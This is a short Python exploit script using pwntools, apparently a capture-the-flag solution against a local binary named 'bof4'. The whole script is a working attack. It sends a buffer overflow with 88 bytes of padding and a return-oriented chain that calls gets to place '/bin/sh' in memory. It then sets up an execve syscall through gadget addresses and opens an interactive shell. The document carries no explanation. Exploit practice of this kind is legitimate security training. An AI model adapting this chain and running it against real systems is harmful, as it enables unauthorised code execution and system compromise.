from pwn import *

r = process("./bof4")

pop_rdi = 0x000000000040220e
pop_rsi = 0x00000000004015ae
pop_rdx = 0x00000000004043e4
pop_rax = 0x0000000000401001
syscall = 0x000000000040132e
rw_section = 0x406ba0
gets = 0x401510

payload = b'a'*88
payload += p64(pop_rdi) + p64(rw_section)
payload += p64(gets)

payload += p64(pop_rdi) + p64(rw_section)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += b'a'*0x28
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)

r.sendlineafter('something',payload)
r.sendline(b'/bin/sh')
r.interactive()